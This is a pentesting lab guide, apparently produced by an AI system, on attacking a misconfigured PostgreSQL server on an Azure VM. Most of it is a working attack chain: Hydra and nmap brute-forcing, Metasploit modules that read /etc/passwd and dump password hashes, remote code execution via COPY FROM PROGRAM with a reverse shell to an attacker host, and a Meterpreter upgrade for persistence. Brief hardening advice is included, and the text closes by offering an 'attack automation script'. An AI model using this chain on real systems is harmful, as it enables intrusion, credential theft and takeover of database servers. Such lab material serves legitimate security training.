## **Part 2: Attacking PostgreSQL on Azure VM**

This guide simulates a misconfigured database deployment inside **Azure
Virtual Machines (VMs)**, commonly exposed due to poor configuration or
default settings. We'll explore vulnerabilities in **PostgreSQL**, using
tools like nmap, Metasploit, and curl to demonstrate enumeration,
brute-force, and remote exploitation.

**🎯 Goal**

Misconfigure PostgreSQL for external access, identify default or weak
credentials, and interact with the database to extract or modify data.

**☁️ Scenario Setup**

**✅ Azure Environment (Common for PostgreSQL)**

- **Target VMs**:

  - OS: Ubuntu 20.04 LTS

  - NSG Rules:

    - PostgreSQL: Port **5432** open (configured manually)

- **Attacker VM**:

  - OS: Kali Linux (or Parrot OS)

  - Tools: nmap, msfconsole, curl, hydra

**Step 1: PostgreSQL Setup on Ubuntu (on Azure)**

sudo apt install postgresql postgresql-client -y

sudo systemctl start postgresql

sudo systemctl enable postgresql

**🔑 Step 2: Set PostgreSQL Passwords & Create Users**

sudo su - postgres

psql -c "ALTER USER postgres WITH PASSWORD '123';"

createuser -EPd ignite

createdb secret -O ignite

ignite is now a database user with a database named secret.

**🌐 Step 3: Enable Remote Access**

Edit config file:

sudo nano /etc/postgresql/12/main/postgresql.conf

Set:

listen_addresses = '\*'

Then edit pg_hba.conf:

sudo nano /etc/postgresql/12/main/pg_hba.conf

Add:

host all all 0.0.0.0/0 md5

Restart PostgreSQL:

sudo service postgresql restart

**📡 Step 4: Nmap Enumeration**

nmap -p5432 --script=pgsql-brute,pgsql-databases,pgsql-version
\<target-ip\>

Use NSE scripts to discover:

- Users

- DB versions

- Accessible DBs

**💣 Step 5: Brute-Force Credentials with Metasploit**

msfconsole

use auxiliary/scanner/postgres/postgres_login

set RHOSTS \<target-ip\>

set USERNAME postgres

set PASSWORD 123

run

If successful, use:

use auxiliary/admin/postgres/postgres_sql

set SQL 'SELECT \* FROM pg_user;'

**🔚 Final Notes & Azure Considerations**

| **Service** | **Port** | **Key Exploits** | **Notes** |
|----|----|----|----|
| CouchDB | 5984 | couchdb_login, cmd_exec | Enable bind_address to localhost only (127.0.0.1) |
| PostgreSQL | 5432 | postgres_login, postgres_sql | Restrict pg_hba.conf to internal IPs only |

**🛡️ Azure Security Recommendations**

- **NSG Rules**: Never expose database ports (5984, 5432) publicly

- **Private Link**: Use Azure Private Endpoint for DBs

- **Logging**: Enable **Azure Monitor** and **Diagnostic Settings**

- **Alerts**: Create alerts for unusual login activity or port scans

# **Compromising PostgreSQL (Port 5432)**

This guide outlines how to discover and exploit **PostgreSQL databases**
deployed on Azure, using tools like Nmap, Hydra, psql, and
**Metasploit** to perform real-world credential attacks, file reading,
command execution, and session hijacking.

**⚙️ Lab Setup (Azure Context)**

| **Role**   | **Details**                                  |
|------------|----------------------------------------------|
| Target VM  | Ubuntu 20.04 with PostgreSQL 12+             |
| IP Address | Public or Internal IP of VM                  |
| NSG Rules  | Port 5432 exposed (externally or internally) |
| Attacker   | Kali Linux VM                                |

**Step 1: Port Scanning and Service Detection**

Use **Nmap** to identify if PostgreSQL is exposed.

nmap -p5432 -sV \<target-ip\>

**Expected Output**:

5432/tcp open postgresql PostgreSQL DB \<version\>

If the port is open, move on to credential discovery.

**🔐 Step 2: Brute-Force Login Credentials (Hydra)**

Use **Hydra** to try common or leaked PostgreSQL credentials.

hydra -L users.txt -P passwords.txt \<target-ip\> postgres

- -L specifies the username wordlist.

- -P specifies the password wordlist.

**If successful**, Hydra will return valid credentials like:

\[5432\]\[postgres\] host: \<target-ip\> login: postgres password: 123

**📡 Step 3: Remote Connection to PostgreSQL**

With valid credentials, connect using the built-in psql client:

psql -h \<target-ip\> -U postgres

You can now list databases and users:

\l -- list databases

\du -- list users and roles

**💣 Step 4: Exploitation Using Metasploit**

**📁 Module 1: Read Arbitrary Files (postgres_readfile)**

If you have superuser credentials, you can read sensitive files:

use auxiliary/admin/postgres/postgres_readfile

set RHOSTS \<target-ip\>

set USERNAME postgres

set PASSWORD 123

set RFILE /etc/passwd

run

**🧾 Module 2: Execute Arbitrary SQL Queries (postgres_sql)**

Use this for banner grabbing or dumping table data.

use auxiliary/admin/postgres/postgres_sql

set RHOSTS \<target-ip\>

set USERNAME ignite

set PASSWORD 123

set SQL 'SELECT version();'

run

You can run **arbitrary SQL queries** using this module.

**🔐 Module 3: Dump All Password Hashes (postgres_hashdump)**

use auxiliary/scanner/postgres/postgres_hashdump

set RHOSTS \<target-ip\>

set USERNAME postgres

set PASSWORD 123

run

Hashes may be stored in internal tables and could be cracked offline.

**⚙️ Module 4: Remote Command Execution via COPY FROM PROGRAM**

**PostgreSQL 9.3+** allows execution of OS commands if the user has
pg_execute_server_program or superuser rights.

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

set RHOSTS \<target-ip\>

set LHOST \<attacker-ip\>

set USERNAME postgres

set PASSWORD 123

run

This will spawn a **command shell** on the remote PostgreSQL server.

**🧑‍💻 Step 5: Escalate to Meterpreter Session**

After gaining a basic shell, upgrade to a Meterpreter session:

sessions

sessions -u \<session_id\>

sessions \<new_session_id\>

This allows you to dump files, pivot, and establish persistence.

**🛡️ Azure Security Recommendations**

| **Layer**      | **Recommendation**                                    |
|----------------|-------------------------------------------------------|
| **NSG**        | Never expose PostgreSQL (5432) to the public Internet |
| **PG_HBA**     | Limit access to known IPs/subnets                     |
| **TLS**        | Enforce SSL for PostgreSQL connections                |
| **RBAC**       | Restrict superuser role usage                         |
| **Monitoring** | Enable **Azure Monitor Logs** and **Alerts**          |
| **VNet**       | Use **Private Endpoint** or **VNet Integration**      |

**📋 Summary of Attack Chain**

| **Phase** | **Tool/Command** | **Goal** |
|----|----|----|
| Recon | nmap -sV -p5432 | Discover PostgreSQL |
| Credential Attack | hydra -L users.txt -P passwords.txt | Brute-force login |
| Manual Access | psql -h target -U postgres | Log in remotely |
| Exploitation | Metasploit modules (readfile, sql, rce) | Access sensitive data/RCE |
| Shell Access | postgres_copy_from_program_cmd_exec | Gain command shell |
| Privilege Upgrade | sessions -u | Convert to Meterpreter |

Would you like this saved as a Markdown/PDF format for your Azure
Pentesting playbook or integrated into a cloud attack automation script?
